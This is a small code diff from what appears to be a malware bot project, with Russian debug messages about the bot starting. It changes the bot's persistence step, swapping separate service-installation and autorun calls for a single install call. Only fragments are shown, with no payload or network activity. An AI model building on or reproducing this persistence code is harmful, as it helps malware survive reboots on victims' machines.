@@ -102,8 +102,9 @@ void InternalAddToAutorun()
 		{
 				PCHAR Name = WSTR::ToAnsi(TempFileName, 0);
 
-				BOT::InstallService(Name);
-				BOT::AddToAutoRun(Name);
+				BOT::Install(Name, false);
+				//BOT::InstallService(Name);
+				//BOT::AddToAutoRun(Name);
 				STR::Free(Name);
 		}
 	#endif
@@ -289,7 +290,7 @@ int APIENTRY MyMain()
 	BOT::Initialize();
 
 	MDBG("Main", "Запускается бот. Версия бота %s\r\nEXE: %s", BOT_VERSION, Bot->ApplicationName().t_str());
-
+	
 	// Проверяем сервис запущен или нет
 	if (BOT::IsService())
 	{
